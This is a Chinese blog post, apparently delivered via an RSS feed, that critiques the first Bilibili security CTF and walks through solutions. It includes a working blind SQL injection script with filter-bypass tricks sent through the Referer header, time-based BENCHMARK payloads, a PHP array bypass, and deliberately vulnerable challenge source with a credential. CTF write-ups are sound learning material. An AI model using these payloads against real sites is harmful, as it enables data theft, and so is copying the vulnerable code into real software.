-<figure class="wp-block-image size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2020/10/image-6.png"><img decoding="async" loading="lazy" src="https://dev.moe/wp-content/uploads/2020/10/image-6-1024x153.png" alt="" class="wp-image-2075" width="628" height="93" srcset="https://dev.moe/wp-content/uploads/2020/10/image-6-1024x153.png 1024w, https://dev.moe/wp-content/uploads/2020/10/image-6-300x45.png 300w, https://dev.moe/wp-content/uploads/2020/10/image-6-768x115.png 768w, https://dev.moe/wp-content/uploads/2020/10/image-6-1536x229.png 1536w, https://dev.moe/wp-content/uploads/2020/10/image-6.png 1554w" sizes="(max-width: 628px) 100vw, 628px" /></a></figure>
-
-
-
-<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">data = 'SkRGWDZRZnJxelJQU21YME42MU04OWlwV1l0SlYvcEJRVEJPWWFYUXVHOGZBcnJ1bjNXS3hXRlpHd05uMjFjRw=='
-aes_128_ecb_decrypt(base64_decode(base64_decode(data)), 'aes_key\0\0\0\0\0\0\0\0\0') // flag9-8b522546-e52d83b8-5682e05c-c8cb237c</pre>
-
-
-
-<p><strong>题 10：</strong><br>1. 扫描题 6 给出的 URL，发现一个包含 jsfuck 代码的页面 <code>test.php</code>。<br>2. 解码获得关键词，并提示访问 github 搜索。<br>3. 在 github 找到<a href="https://github.com/interesting-1024/end/" target="_blank" rel="noreferrer noopener">源码</a>后用 ?id[]=1 绕过 PHP 判断<br>4. <span style="text-decoration: underline;">猜出</span> flag 位于 <code><strong>[这里填入一个任意字符]</strong>flag.txt</code>（实质是 <code>strpos($url, 'flag.txt') != false</code> 就给过）<br><em><span style="color:#6E6E6E" class="has-inline-color">B：你说 strpos 返回值需要用 <strong>!== </strong>运算符来判断？不，我就是要用 <strong>!=</strong> ~</span></em></p>
-
-
-
-<figure class="wp-block-image size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2020/10/image-3.png"><img decoding="async" loading="lazy" src="https://dev.moe/wp-content/uploads/2020/10/image-3-1024x591.png" alt="" class="wp-image-2030" width="577" height="333" srcset="https://dev.moe/wp-content/uploads/2020/10/image-3-1024x591.png 1024w, https://dev.moe/wp-content/uploads/2020/10/image-3-300x173.png 300w, https://dev.moe/wp-content/uploads/2020/10/image-3-768x443.png 768w, https://dev.moe/wp-content/uploads/2020/10/image-3.png 1339w" sizes="(max-width: 577px) 100vw, 577px" /></a></figure>
-
-
-
-<figure class="wp-block-image size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2020/10/image-4.png"><img decoding="async" loading="lazy" src="https://dev.moe/wp-content/uploads/2020/10/image-4.png" alt="" class="wp-image-2031" width="575" height="137" srcset="https://dev.moe/wp-content/uploads/2020/10/image-4.png 1019w, https://dev.moe/wp-content/uploads/2020/10/image-4-300x72.png 300w, https://dev.moe/wp-content/uploads/2020/10/image-4-768x183.png 768w" sizes="(max-width: 575px) 100vw, 575px" /></a></figure>
-
-
-
-<p>好了，吐槽部分结束，作为比较菜的 ctf 玩家，第 6 题作为一道盲注还是有些东西可以写。第 7 题和第 9 题题目在比赛临近结束大佬提示后才找到题目位置，没想到依然是猜路径。</p>
-
-
-
-<h2>第 6 题：Boolean based Blind&nbsp;SQL Injection</h2>
-
-
-
-<figure class="wp-block-image size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2020/10/image-2.png"><img decoding="async" loading="lazy" src="https://dev.moe/wp-content/uploads/2020/10/image-2-1024x467.png" alt="" class="wp-image-2027" width="765" height="348" srcset="https://dev.moe/wp-content/uploads/2020/10/image-2-1024x467.png 1024w, https://dev.moe/wp-content/uploads/2020/10/image-2-300x137.png 300w, https://dev.moe/wp-content/uploads/2020/10/image-2-1536x701.png 1536w, https://dev.moe/wp-content/uploads/2020/10/image-2-2048x935.png 2048w, https://dev.moe/wp-content/uploads/2020/10/image-2-1568x716.png 1568w" sizes="(max-width: 765px) 100vw, 765px" /></a></figure>
-
-
-
-<p>第 6 题是一个 SELECT 的 SQL 语句（一开始以为是 INSERT 之类的），注入点位于 HTTP_REFERER。如果有结果则显示文章，无结果显示空文章，本应是一个基于布尔值的盲注（Boolean based Blind&nbsp;SQL Injection）。</p>
-
-
-
-<pre class="EnlighterJSRAW" data-enlighter-language="php" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">$payload_sql = "SELECT * FROM bilictf.refer where refer='{filter($_SERVER['HTTP_REFERER'])}';";</pre>
-
-
-
-<p>filter 函数过滤了一些关键词，同时 MySQL 禁用了 Sleep 函数（后来又允许使用了），但 Benchmark 函数未禁用（这可能也是本题靶机频繁宕机的原因之一）。使用 sqlmap 及合适的 level / risk 参数（以及在没有人跑 sqlmap 的靶机不会宕机的深夜）可以跑出一个基于时间的盲注（Time based Blind&nbsp;SQL Injection）。</p>
-
-
-
-<p>如果用 Benchmark 函数做，Payload 如下：</p>
-
-
-
-<pre class="EnlighterJSRAW" data-enlighter-language="sql" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">SELECT ... WHERE refer='' + IF(ascii(SUBSTRING(database(),1,1))>32,BENCHMARK(5000000,MD5(1)),0)</pre>
-
-
-
-<p>解出题目后发现其实是基于布尔值的盲注（通过文章显示与否判断），预期解如下：</p>
-
-
-
-<pre class="EnlighterJSRAW" data-enlighter-language="sql" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">SELECT ... WHERE refer='' or IF(ascii(SUBSTRING(database(),1,1))>32,1,0)</pre>
-
-
-
-<p>脚本如下：</p>
-
-
-
-<pre class="EnlighterJSRAW" data-enlighter-language="python" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">import requests
-
-url = "http://.../blog/single.php?id=1"
-result = ""
-
-ascii_list = range(1, 128)
-strpos = len(result)
-
-while(True):
-    strpos += 1
-    arr = ascii_list
-    start = 0
-    end = len(arr)
-
-    while(start &lt; end):
-        # time.sleep(0.2)
-        mid = (start + end)//2
-
-        # sql = "(SELECT database())" # bilictf
-        sql = "(SELECT`flag`FROM`flag`)"
-
-        payload = "' or IF(ascii(SUBSTRING(%s,%s,1))>%s,1,0)-- a" % (sql, strpos, arr[mid])
-
-        # 绕过过滤
-        payload = payload.replace("SELECT", "SEL&amp;ECT")
-        payload = payload.replace("or", "o&amp;r")
-
-        data = {'name': 'name'}
-        headers = {'Referer': payload, 'User-Agent': 'Mozilla/5.0'}
-        response = requests.post(url, data=data, headers=headers)
-        response.encoding = 'utf-8'
-        
-        page_byte = response.headers['Content-Length']
-        if int(page_byte) > 1487:
-            if end - start == 1:
-                if end &lt; 127:
-                    now_word = chr(arr[end])
-                else:
-                    now_word = '?' # 中文
-                result += now_word
-                break
-            else:
-                start = mid
-        else:
-            end = mid
-            now_word = ""
-    if now_word == "":
-        break
-    print(result)
-print('result:', result)
-</pre>
-
-
-
-<figure class="wp-block-image size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2020/10/image-1.png"><img decoding="async" loading="lazy" src="https://dev.moe/wp-content/uploads/2020/10/image-1.png" alt="" class="wp-image-1927" width="424" height="165" srcset="https://dev.moe/wp-content/uploads/2020/10/image-1.png 588w, https://dev.moe/wp-content/uploads/2020/10/image-1-300x117.png 300w" sizes="(max-width: 424px) 100vw, 424px" /></a><figcaption>运行结果</figcaption></figure>
-
-
-
-<h2>总结</h2>
-
-
-
-<figure class="wp-block-image size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2020/10/1.png"><img decoding="async" loading="lazy" src="https://dev.moe/wp-content/uploads/2020/10/1.png" alt="" class="wp-image-1912" width="457" height="331" srcset="https://dev.moe/wp-content/uploads/2020/10/1.png 597w, https://dev.moe/wp-content/uploads/2020/10/1-300x217.png 300w" sizes="(max-width: 457px) 100vw, 457px" /></a><figcaption>看来B站钱都花在前端上了</figcaption></figure>
-
-
-
-<p>回顾整场比赛，除了坑还是坑。前端代码残留了很多无助于解题的代码及注释。解题基本靠猜的情况导致了赛中提示就在网上漫天飞（说实话，如果没有这些提示，很多题我也猜不出）。现在看来，开赛初的那个小插曲只是这比赛各种坑点的冰山一角&#8230;</p>
-
-
-
-<p>不过，围观各路神仙在最后一题 <a href="https://github.com/interesting-1024/end/issues" target="_blank" rel="noreferrer noopener">github repo 中的吐槽</a>倒是成为了这次比赛的乐趣。有把 ETag&nbsp;当成 flag（假装）认真提出思路的，有用神奇的手法分析比赛中各种图片、挖出各种“证据”的，有练习给总部写英语作文索要 flag 的，还有galgame汉化组发招人广告的。天知道出题者不关 issue 是失误还是有意为之。</p>
-
-
-
-<p>另外，<a href="https://hack.lug.ustc.edu.cn/" target="_blank" rel="noreferrer noopener">Hackergame 2020</a> 几天后也要开始了。同样是偏趣味性的竞赛，但题目质量就很不错（至少<a href="https://dev.moe/1321" target="_blank" rel="noreferrer noopener">前两年</a>是如此），也能学到很多新东西，在此推荐给大家。</p>
-
-
-
-<p>附录附上了一些题目的源码，留作参考。</p>
-
-
-
-<p><strong>Coxxs</strong></p>
-
-
-
-<hr class="wp-block-separator"/>
-
-
-
-<p><strong>P.S.</strong> single.php 中的逻辑部分：</p>
-
-
-
-<pre class="EnlighterJSRAW" data-enlighter-language="php" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">&lt;?php
-
-function filter($str)
-{
-  $str = str_replace( '/', "", $str);
-  $str = str_replace( '"', "", $str);
-  $str = str_replace( '%', "", $str);
-  $str = str_ireplace('and', "",$str);
-  $str = str_ireplace('or',"",$str);
-  $str = str_replace('&amp;&amp;'," ",$str);
-  $str = str_replace('||'," ",$str);
-  $str = str_replace( ';', "", $str);
-  $str = str_ireplace( 'eval', " ", $str);
-  $str = str_ireplace( 'open', " ", $str);
-  $str = str_ireplace( 'sysopen', " ", $str);
-  $str = str_ireplace( 'system', " ", $str);
-  $str = str_ireplace("select","",$str);
-  $str = str_ireplace("join","",$str);
-  $str = str_ireplace("union","",$str);
-  $str = str_ireplace("where","",$str);
-  $str = str_ireplace("insert","",$str);
-  $str = str_ireplace("delete"," ",$str);
-  $str = str_ireplace("update"," ",$str);
-  $str = str_ireplace("like","",$str);
-  $str = str_ireplace("drop"," ",$str);
-  $str = str_ireplace("DROP"," ",$str);
-    $str = str_replace("&amp;","",$str);
-  return $str;
-}
-
- 
-$servername = "localhost";
-$username = "root";
-$password = "2f7780c88a1301d04050b16e686dcea2";
- 
-$conn = mysqli_connect($servername, $username, $password);
-mysqli_select_db($conn,"bilictf");
- 
-if (!$conn) {
-  die("Connection failed: " . mysqli_connect_error());
-}
-$aid =$_GET['id'];
-$refer = $_SERVER["HTTP_REFERER"];
- 
-if (!isset($aid))
-{
-  return;
-}
-if (!isset($refer))
-{
-    $refer = "https://www.bilibili.com/";
-}
-
-$aid = filter($aid);
-$refer = filter($refer);
-
-$sql = "SELECT * FROM bilictf.article where article_id=1;";
-
-$payload_sql =  "SELECT * FROM bilictf.refer where refer='$refer';";
-//echo $payload_sql;
-$result_payload = mysqli_query($conn, $payload_sql);
-if (mysqli_num_rows($result_payload) > 0) {
-    //echo $sql;
-    $result = mysqli_query($conn, $sql);
-    if (mysqli_num_rows($result) > 0) {
-      while($row = mysqli_fetch_assoc($result)) {
-        $title = $row["title"];
-            $content = $row["content"];
-            $creator = $row["creator"];
-            $time = $row["time"];
-    }
-    } else {
-      echo "0";
-    }
-} else {
-    $title = "null";
-    $content = "null";
-    $creator = "null";
-    $time = "null";
-}
-?></pre>
-
-
-
-<p><strong>P.P.S.</strong> 第 10 题的 end.php 实际源码：</p>
-
-
-
-<pre class="EnlighterJSRAW" data-enlighter-language="php" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">&lt;?php
-
-$str = intval($_GET['id']);
-$reg = preg_match('/\d/is', $_GET['id']);
-
-if(!is_numeric($_GET['id']) and $reg !== 1 and $str === 1){
-  $content = file_get_contents($_GET['url']);
-  //echo $content;
-  $filename = "./imgs/bilibili_224a634752448def6c0ec064e49fe797_havefun".".jpg";
-  if (strpos($_GET['url'],"flag.txt") == false){
-    echo "还差一点点啦～";
-  }else{
-    //file_put_contents($filename,$content);
-    echo "&lt;img src=".$filename.">";
-  }
-}else{
-  echo "你想要的不在这儿～";
-}
-?></pre>
-<p><a rel="nofollow" href="https://dev.moe/1907">首届 Bilibili 安全挑战赛吐槽</a>最先出现在<a rel="nofollow" href="https://dev.moe">Coxxs</a>。</p>
-]]></content:encoded>
-					
-					<wfw:commentRss>https://dev.moe/1907/feed</wfw:commentRss>
-			<slash:comments>8</slash:comments>
-		
-		
-		<post-id xmlns="com-wordpress:feed-additions:1">1907</post-id>	</item>
 	</channel>
 </rss>
